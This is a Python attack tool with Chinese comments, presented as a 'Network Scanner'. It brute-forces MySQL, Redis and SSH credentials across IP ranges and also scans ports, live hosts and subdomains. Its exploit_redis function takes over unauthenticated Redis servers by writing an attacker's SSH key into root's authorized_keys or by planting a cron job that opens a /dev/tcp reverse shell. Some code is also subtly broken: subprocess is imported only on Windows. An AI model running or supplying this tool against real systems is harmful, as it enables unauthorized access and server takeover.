import argparse
import threading
import pymysql
import redis
import paramiko
import os
import socket
import requests
import warnings
import ipaddress

# --- 全局设置 ---
# 忽略 paramiko 和 requests 的一些警告信息
warnings.filterwarnings("ignore")


# --- 辅助模块：IP地址解析 ---
def parse_hosts(host_str):
    """解析多种格式的主机地址输入 (单个IP, CIDR, IP范围)"""
    hosts = []
    try:
        if '/' in host_str:
            # CIDR notation, e.g., 192.168.1.0/24
            network = ipaddress.ip_network(host_str, strict=False)
            for ip in network.hosts():
                hosts.append(str(ip))
        elif '-' in host_str:
            # IP range, e.g., 192.168.1.1-100 or 192.168.1.1-192.168.1.100
            parts = host_str.split('-')
            start_ip_str = parts[0]
            end_ip_str = parts[1]
            start_ip = ipaddress.ip_address(start_ip_str)
            # 处理 192.168.1.1-100 这样的简写
            if '.' not in end_ip_str:
                end_ip_str = ".".join(start_ip_str.split('.')[:-1] + [end_ip_str])
            end_ip = ipaddress.ip_address(end_ip_str)

            current_ip = start_ip
            while current_ip <= end_ip:
                hosts.append(str(current_ip))
                current_ip += 1
        else:
            # 单个IP，验证其合法性
            ipaddress.ip_address(host_str)
            hosts.append(host_str)
    except ValueError as e:
        print(f"[!] 错误: 无效的主机地址格式 '{host_str}' - {e}")
        return []
    return hosts


# --- 模块：MySQL 扫描 ---
def scan_mysql(host, port, user, password, connect_timeout=5):
    """尝试使用给定的用户名和密码连接MySQL"""
    try:
        pymysql.connect(
            host=host,
            port=port,
            user=user,
            password=password,
            connect_timeout=connect_timeout,
            database="information_schema",
            charset="utf8",
            autocommit=True,
        )
        print(f"[+] MySQL 成功: {host}:{port} -> {user} / {password}")
    except Exception:
        pass


def mysql_brute_force(args):
    """MySQL 弱口令爆破主函数"""
    print(f"[*] 开始对 {args.host} 进行 MySQL 弱口令扫描...")
    target_hosts = parse_hosts(args.host)
    if not target_hosts:
        return

    threads = []
    try:
        with open(args.user_dict, "r", encoding="utf-8") as users_file:
            users = [u.strip() for u in users_file.readlines() if u.strip()]
        with open(args.pass_dict, "r", encoding="utf-8") as passwords_file:
            passwords = [p.strip() for p in passwords_file.readlines() if p.strip()]

        for host in target_hosts:
            for user in users:
                for password in passwords:
                    t = threading.Thread(target=scan_mysql, args=(host, args.port, user, password))
                    threads.append(t)
                    t.start()
    except FileNotFoundError as e:
        print(f"[!] 错误: 字典文件未找到 - {e.filename}")
        return

    for t in threads:
        t.join()
    print("[*] MySQL 扫描结束。")


# --- 模块：Redis 扫描 ---
def scan_redis(host, port, password, timeout=5):
    """扫描Redis弱口令及未授权访问漏洞"""
    try:
        redis_client = redis.Redis(
            host=host,
            port=port,
            password=password,
            db=0,
            socket_connect_timeout=timeout,
            decode_responses=True
        )
        if redis_client.ping():
            print(f"[+] Redis 成功: {host}:{port} -> 密码: '{password or '无'}'")
            # 检查未授权访问
            try:
                # 尝试设置一个临时配置来判断权限
                original_dir = redis_client.config_get("dir")['dir']
                redis_client.config_set("dir", "/tmp")
                if redis_client.config_get("dir")['dir'] == "/tmp":
                    print(f"[!] 漏洞: {host}:{port} 存在 Redis 未授权访问漏洞!")
                    # 恢复原始目录
                    redis_client.config_set("dir", original_dir)
                    # 此处可以添加漏洞利用代码，为安全起见，默认注释
                    # exploit_redis(redis_client)
                redis_client.close()
            except redis.exceptions.ResponseError:
                # 没有权限修改配置
                pass
    except (redis.exceptions.AuthenticationError, redis.exceptions.TimeoutError, redis.exceptions.ConnectionError):
        pass
    except Exception as e:
        # print(f"[-] Redis 扫描出现错误: {e}")
        pass


def exploit_redis(redis_client):
    """Redis 未授权访问漏洞利用函数 (示例)"""
    print("请选择漏洞利用方式:")
    print("1. 写入 SSH 公钥")
    print("2. 添加 cron 定时任务反弹 shell")
    option = input("请输入你的选择: ")

    if option == '1':
        ssh_key = input("请输入你的公钥: ").strip()
        redis_client.config_set('dir', '/root/.ssh/')
        redis_client.config_set('dbfilename', 'authorized_keys')
        redis_client.set('exploit', f'\n\n{ssh_key}\n\n')
        redis_client.save()
        print("[+] SSH 公钥已写入. 请尝试使用你的私钥登录。")
    elif option == '2':
        lhost = input("请输入反弹 shell 的 IP (LHOST): ").strip()
        lport = input("请输入反弹 shell 的端口 (LPORT): ").strip()
        cron_task = f'\n\n*/1 * * * * bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n\n'
        redis_client.config_set('dir', '/var/spool/cron')
        redis_client.config_set('dbfilename', 'root')
        redis_client.set('exploit', cron_task)
        redis_client.save()
        print(f"[+] Cron 任务已添加. 请检查你在 {lhost}:{lport} 上的监听。")


def redis_brute_force(args):
    """Redis 弱口令爆破主函数"""
    print(f"[*] 开始对 {args.host} 进行 Redis 弱口令扫描...")
    target_hosts = parse_hosts(args.host)
    if not target_hosts:
        return

    threads = []
    try:
        with open(args.pass_dict, "r", encoding="utf-8") as passwords_file:
            passwords = [p.strip() for p in passwords_file.readlines() if p.strip()]

        for host in target_hosts:
            # 首先尝试空密码
            t_blank = threading.Thread(target=scan_redis, args=(host, args.port, ""))
            threads.append(t_blank)
            t_blank.start()
            # 然后尝试字典中的密码
            for password in passwords:
                t = threading.Thread(target=scan_redis, args=(host, args.port, password))
                threads.append(t)
                t.start()
    except FileNotFoundError as e:
        print(f"[!] 错误: 字典文件未找到 - {e.filename}")
        return

    for t in threads:
        t.join()
    print("[*] Redis 扫描结束。")


# --- 模块：SSH 扫描 ---
def scan_ssh(host, port, user, password):
    """尝试使用给定的用户名和密码进行SSH连接"""
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(host, port, user, password, timeout=10)
        print(f"[+] SSH 成功: {host}:{port} -> {user} / {password}")
        ssh_client.close()
    except paramiko.AuthenticationException:
        pass  # 认证失败，正常
    except Exception:
        pass  # 其他异常，如连接超时


def ssh_brute_force(args):
    """SSH 弱口令爆破主函数"""
    print(f"[*] 开始对 {args.host} 进行 SSH 弱口令扫描...")
    target_hosts = parse_hosts(args.host)
    if not target_hosts:
        return

    threads = []
    try:
        with open(args.user_dict, "r", encoding="utf-8") as users_file:
            users = [u.strip() for u in users_file.readlines() if u.strip()]
        with open(args.pass_dict, "r", encoding="utf-8") as passwords_file:
            passwords = [p.strip() for p in passwords_file.readlines() if p.strip()]

        for host in target_hosts:
            for user in users:
                for password in passwords:
                    t = threading.Thread(target=scan_ssh, args=(host, args.port, user, password))
                    threads.append(t)
                    t.start()
    except FileNotFoundError as e:
        print(f"[!] 错误: 字典文件未找到 - {e.filename}")
        return

    for t in threads:
        t.join()
    print("[*] SSH 扫描结束。")


# --- 模块：主机探测 ---
def scan_host(ip):
    """使用ping命令探测主机是否存活"""
    # -n 1 (Windows) or -c 1 (Linux/macOS)
    command = f"ping -c 1 -W 1 {ip}" if os.name != 'nt' else f"ping -n 1 -w 500 {ip}"
    try:
        # 隐藏命令执行窗口
        startupinfo = None
        if os.name == 'nt':
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE

        output = subprocess.check_output(command, shell=True, startupinfo=startupinfo, stderr=subprocess.STDOUT)
        if "ttl=" in output.decode('gbk', errors='ignore').lower():
            print(f"[+] 发现主机: {ip} 存活。")

    except (subprocess.CalledProcessError, FileNotFoundError):
        pass


def host_discovery(args):
    """主机发现主函数"""
    print(f"[*] 开始在 {args.network} 网段进行主机发现...")
    target_hosts = parse_hosts(args.network)
    if not target_hosts:
        return

    threads = []
    for ip in target_hosts:
        t = threading.Thread(target=scan_host, args=(ip,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()
    print("[*] 主机发现结束。")


# --- 模块：端口扫描 ---
def scan_port(host, port):
    """扫描单个端口是否开放"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            result = s.connect_ex((host, port))
            if result == 0:
                print(f"[+] 发现端口: {host}:{port} 开放。")
    except socket.error:
        pass


def port_scan(args):
    """端口扫描主函数"""
    print(f"[*] 开始对 {args.host} 的端口 {args.ports} 进行扫描...")
    target_hosts = parse_hosts(args.host)
    if not target_hosts:
        return

    threads = []
    try:
        ports_to_scan = []
        if '-' in args.ports:
            start, end = map(int, args.ports.split('-'))
            ports_to_scan = range(start, end + 1)
        else:
            ports_to_scan = [int(p) for p in args.ports.split(',')]

        for host in target_hosts:
            for port in ports_to_scan:
                t = threading.Thread(target=scan_port, args=(host, port))
                threads.append(t)
                t.start()

        for t in threads:
            t.join()
    except ValueError:
        print("[!] 错误: 无效的端口范围. 请使用 '80,88,8080' 或 '1-1024' 格式。")
    print("[*] 端口扫描结束。")


# --- 模块：子域名扫描 ---
def scan_subdomain(domain, sub):
    """扫描单个子域名是否存在"""
    url = f"http://{sub}.{domain}"
    try:
        # 允许重定向，超时时间为3秒
        response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=3, allow_redirects=True)
        # 任何看起来不像错误的响应码都认为子域名存在
        if response.status_code < 400 or response.status_code == 403 or response.status_code == 401:
            print(f"[+] 发现子域名: {sub}.{domain}")
    except requests.exceptions.RequestException:
        pass


def subdomain_scan(args):
    """子域名扫描主函数"""
    print(f"[*] 开始为 {args.domain} 进行子域名扫描...")
    threads = []
    try:
        with open(args.sub_dict, "r", encoding="utf-8") as subs:
            for sub in subs:
                sub = sub.strip()
                if sub:
                    t = threading.Thread(target=scan_subdomain, args=(args.domain, sub))
                    threads.append(t)
                    t.start()
    except FileNotFoundError as e:
        print(f"[!] 错误: 字典文件未找到 - {e.filename}")
        return

    for t in threads:
        t.join()
    print("[*] 子域名扫描结束。")


# --- 主函数和命令行解析 ---
def main():
    """主函数，用于解析命令行参数并调用相应的功能"""

    banner = r"""
    _   _      _                      _
   / \   _ __| |_ ___ _ __ ___   ___ | | ___  ___
  / _ \ | '__| __/ _ \ '_ ` _ \ / _ \| |/ _ \/ __|
 / ___ \| |  | ||  __/ | | | | | (_) | |  __/\__ \
/_/   \_\_|   \__\___|_| |_| |_|\___/|_|\___||___/
  ____                                  
 / ___|  ___ __ _ _ __  _ __   ___ _ __ 
 \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
  ___) | (_| (_| | | | | | | |  __/ |   
 |____/ \___\__,_|_| |_|_| |_|\___|_|   

 :: Network Scanner ::                  [v0.1]

    """
    print(banner)

    parser = argparse.ArgumentParser(description="Network Scanner v0.1")
    subparsers = parser.add_subparsers(dest="command", help="可用命令")

    # 通用主机参数帮助信息
    host_help = "目标主机，支持格式：单个IP (192.168.1.1), 范围 (192.168.1.1-100), CIDR (192.168.1.0/24)"

    # MySQL 子命令
    mysql_parser = subparsers.add_parser("mysql", help="MySQL 弱口令扫描器")
    mysql_parser.add_argument("host", help=host_help)
    mysql_parser.add_argument("-P", "--port", type=int, default=3306, help="MySQL 端口 (默认: 3306)")
    mysql_parser.add_argument("-u", "--user-dict", default="user.dict", help="用户名字典文件 (默认: user.dict)")
    mysql_parser.add_argument("-p", "--pass-dict", default="passwd.dict", help="密码字典文件 (默认: passwd.dict)")
    mysql_parser.set_defaults(func=mysql_brute_force)

    # Redis 子命令
    redis_parser = subparsers.add_parser("redis", help="Redis 弱口令及未授权访问扫描器")
    redis_parser.add_argument("host", help=host_help)
    redis_parser.add_argument("-P", "--port", type=int, default=6379, help="Redis 端口 (默认: 6379)")
    redis_parser.add_argument("-p", "--pass-dict", default="passwd.dict", help="密码字典文件 (默认: passwd.dict)")
    redis_parser.set_defaults(func=redis_brute_force)

    # SSH 子命令
    ssh_parser = subparsers.add_parser("ssh", help="SSH 弱口令扫描器")
    ssh_parser.add_argument("host", help=host_help)
    ssh_parser.add_argument("-P", "--port", type=int, default=22, help="SSH 端口 (默认: 22)")
    ssh_parser.add_argument("-u", "--user-dict", default="user.dict", help="用户名字典文件 (默认: user.dict)")
    ssh_parser.add_argument("-p", "--pass-dict", default="passwd.dict", help="密码字典文件 (默认: passwd.dict)")
    ssh_parser.set_defaults(func=ssh_brute_force)

    # 主机发现 子命令
    host_parser = subparsers.add_parser("host", help="主机发现扫描器")
    host_parser.add_argument("network", help="目标网段, 支持格式：范围 (192.168.1.1-254), CIDR (192.168.1.0/24)")
    host_parser.set_defaults(func=host_discovery)

    # 端口扫描 子命令
    port_parser = subparsers.add_parser("port", help="端口扫描器")
    port_parser.add_argument("host", help=host_help)
    port_parser.add_argument("-p", "--ports", default="1-1000",
                             help="要扫描的端口 (例如: '80,443' 或 '1-1024', 默认: 1-1000)")
    port_parser.set_defaults(func=port_scan)

    # 子域名扫描 子命令
    subdomain_parser = subparsers.add_parser("subdomain", help="子域名扫描器")
    subdomain_parser.add_argument("domain", help="目标域名 (例如: example.com)")
    subdomain_parser.add_argument("-d", "--sub-dict", default="domin.dict", help="子域名字典文件 (默认: domin.dict)")
    subdomain_parser.set_defaults(func=subdomain_scan)

    args = parser.parse_args()

    if hasattr(args, 'func'):
        args.func(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    # 在Windows下，为了让ping命令不弹出黑框，需要引入subprocess
    if os.name == 'nt':
        import subprocess
    main()




